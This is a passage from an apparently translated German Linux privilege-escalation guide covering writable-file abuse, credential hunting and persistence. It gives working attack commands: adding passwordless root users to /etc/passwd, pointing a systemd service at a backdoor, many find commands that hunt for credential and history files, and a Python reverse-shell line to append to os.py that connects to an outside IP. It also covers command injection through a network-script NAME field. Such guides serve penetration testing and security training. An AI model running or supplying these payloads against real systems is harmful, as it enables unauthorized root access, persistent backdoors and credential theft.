hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Z. B.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sie können nun den `su`-Befehl mit `hacker:hacker` verwenden.

Alternativ können Sie die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\ WARNUNG: Sie könnten die aktuelle Sicherheit der Maschine beeinträchtigen.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
HINWEIS: Auf BSD-Plattformen befindet sich /etc/passwd unter /etc/pwd.db und /etc/master.passwd, außerdem wurde /etc/shadow in /etc/spwd.db umbenannt.

Sie sollten prüfen, ob Sie in einige **sensible Dateien** schreiben können. Zum Beispiel: Können Sie in eine **Dienstkonfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel: Wenn auf der Maschine ein **tomcat** Server läuft und Sie in der Lage sind, **modify the Tomcat service configuration file inside /etc/systemd/,** dann können Sie die Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Deine backdoor wird beim nächsten Start von tomcat ausgeführt.

### Ordner prüfen

Die folgenden Ordner können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich kannst du den letzten nicht lesen, aber versuche es.)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Seltsamer Ort/Owned-Dateien
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Geänderte Dateien in den letzten Minuten
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-Dateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries im PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webdateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sicherungen**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien, die passwords enthalten

Lies den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), er durchsucht **mehrere mögliche Dateien, die passwords enthalten könnten**.\
**Ein weiteres interessantes Tool**, das du dafür verwenden kannst, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) welche eine Open-Source-Anwendung ist, um viele passwords auszulesen, die auf einem lokalen Computer für Windows, Linux & Mac gespeichert sind.

### Logs

Wenn du Logs lesen kannst, kannst du möglicherweise **interessante/vertrauliche Informationen darin** finden. Je ungewöhnlicher der Log ist, desto interessanter wird er wahrscheinlich sein.\
Außerdem können einige "**bad**" konfigurierte (backdoored?) **audit logs** es erlauben, passwords innerhalb der audit logs zu protokollieren, wie in diesem Beitrag erläutert: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um **Logs zu lesen**, ist die Gruppe [**adm**](interesting-groups-linux-pe/index.html#adm-group) sehr hilfreich.

### Shell-Dateien
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Du solltest außerdem nach Dateien suchen, die das Wort "**password**" im **Namen** oder im **Inhalt** enthalten, und auch nach IPs und E-Mails in Logs oder Hashes/Regexps suchen.\
Ich werde hier nicht auflisten, wie man das alles macht, aber wenn du interessiert bist, kannst du die letzten Checks sehen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) durchführt.

## Beschreibbare Dateien

### Python library hijacking

Wenn du weißt, **wo** ein python script ausgeführt wird und du in diesen Ordner **schreiben kannst** oder die **python libraries** ändern kannst, kannst du die OS library modifizieren und backdoor it (wenn du dort schreiben kannst, wo das python script ausgeführt wird, kopiere die os.py library).

Um die Bibliothek zu **backdoor the library**, füge einfach am Ende der os.py library die folgende Zeile hinzu (IP und PORT ändern):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate-Ausnutzung

Eine Schwachstelle in `logrotate` erlaubt es Benutzern mit **Schreibrechten** auf eine Logdatei oder deren übergeordnete Verzeichnisse, möglicherweise erhöhte Privilegien zu erlangen. Das liegt daran, dass `logrotate`, oft als **root** laufend, so manipuliert werden kann, dass es beliebige Dateien ausführt, besonders in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_ zu prüfen, sondern auch in jedem Verzeichnis, in dem Logrotation angewendet wird.

> [!TIP]
> Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und älter

Detailliertere Informationen zur Schwachstelle finden Sie auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Diese Schwachstelle kann mit [**logrotten**](https://github.com/whotwagner/logrotten) ausgenutzt werden.

Diese Schwachstelle ist sehr ähnlich zu [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** daher, wann immer Sie feststellen, dass Sie Logs verändern können, prüfen Sie, wer diese Logs verwaltet, und ob Sie Privilegien eskalieren können, indem Sie die Logs durch Symlinks ersetzen.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referenz zur Schwachstelle:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus welchem Grund auch immer ein `ifcf-<whatever>`-Skript in _/etc/sysconfig/network-scripts_ **schreiben** kann **oder** ein vorhandenes **anpassen** kann, dann ist Ihr **System pwned**.

Netzwerk-Skripte, z. B. _ifcg-eth0_, werden für Netzwerkverbindungen verwendet. Sie sehen genau wie .INI-Dateien aus. Allerdings werden sie auf Linux vom Network Manager (dispatcher.d) \~sourced\~.

In meinem Fall wird das Attribut `NAME=` in diesen Netzwerk-Skripten nicht korrekt behandelt. Wenn Sie **Leerzeichen im Namen haben, versucht das System den Teil nach dem Leerzeichen auszuführen**. Das bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

Zum Beispiel: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Beachte das Leerzeichen zwischen Network und /bin/id_)

### **init, init.d, systemd und rc.d**

Das Verzeichnis `/etc/init.d` ist die Heimat von **Skripten** für System V init (SysVinit), dem **klassischen Linux-Service-Management-System**. Es enthält Skripte zum `start`, `stop`, `restart` und manchmal `reload` von Services. Diese können direkt ausgeführt oder über symbolische Links in `/etc/rc?.d/` aufgerufen werden. Ein alternativer Pfad bei Redhat-Systemen ist `/etc/rc.d/init.d`.

Auf der anderen Seite ist `/etc/init` mit **Upstart** verbunden, einem neueren **Service-Management**, das von Ubuntu eingeführt wurde und Konfigurationsdateien für Dienstverwaltungsaufgaben verwendet. Trotz der Umstellung auf Upstart werden SysVinit-Skripte aufgrund einer Kompatibilitätsschicht in Upstart weiterhin neben Upstart-Konfigurationen verwendet.

**systemd** tritt als moderner Initialisierungs- und Service-Manager auf und bietet erweiterte Funktionen wie bedarfsabhängiges Starten von Daemons, Automount-Verwaltung und Snapshots des Systemzustands. Es organisiert Dateien in `/usr/lib/systemd/` für Distributionspakete und `/etc/systemd/system/` für Administratoranpassungen und vereinfacht so die Systemadministration.

## Weitere Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks hooken üblicherweise einen syscall, um privilegierte Kernel-Funktionalität einem userspace-Manager zugänglich zu machen. Schwache Manager-Authentifizierung (z. B. Signaturprüfungen basierend auf FD-Reihenfolge oder schwache Passwortschemata) kann einer lokalen App erlauben, den Manager vorzutäuschen und auf bereits gerooteten Geräten Root-Rechte zu erlangen. Mehr Informationen und Exploit-Details hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Mehr Hilfe

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Bestes Tool, um nach lokalen Linux privilege escalation-Vektoren zu suchen:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referenzen

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
